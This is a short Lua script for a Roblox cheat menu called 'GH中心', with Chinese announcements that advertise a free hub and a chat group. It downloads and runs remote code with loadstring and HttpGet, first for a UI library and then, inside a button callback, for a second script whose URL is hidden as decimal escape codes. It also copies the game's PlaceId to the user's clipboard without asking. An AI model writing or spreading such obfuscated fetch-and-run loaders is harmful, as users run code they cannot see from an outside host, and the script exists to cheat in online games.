local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/fuhfhjgcgjb/XNS_NN-/refs/heads/main/UI.txt.lua"))()
local Window = OrionLib:MakeWindow({Name = "GH中心", HidePremium = false, IntroText = "GH中心"})
local Tab = Window:MakeTab({
	Name = "公告",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddParagraph("免费缝合 群:915207093")
Tab:AddParagraph("倒卖sm")
setclipboard(""..game.PlaceId)
local Tab = Window:MakeTab({
	Name = "其他脚本",
	Icon = "rbxassetid://7733779610",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "bin脚本",
	Callback = function()
      		print("button pressed")
      		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\110\110\122\104\111\110\104\120\105\110\47\98\105\110\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\98\105\110\46\108\117\97\34\41\41\40\41\10")()
  	end    
})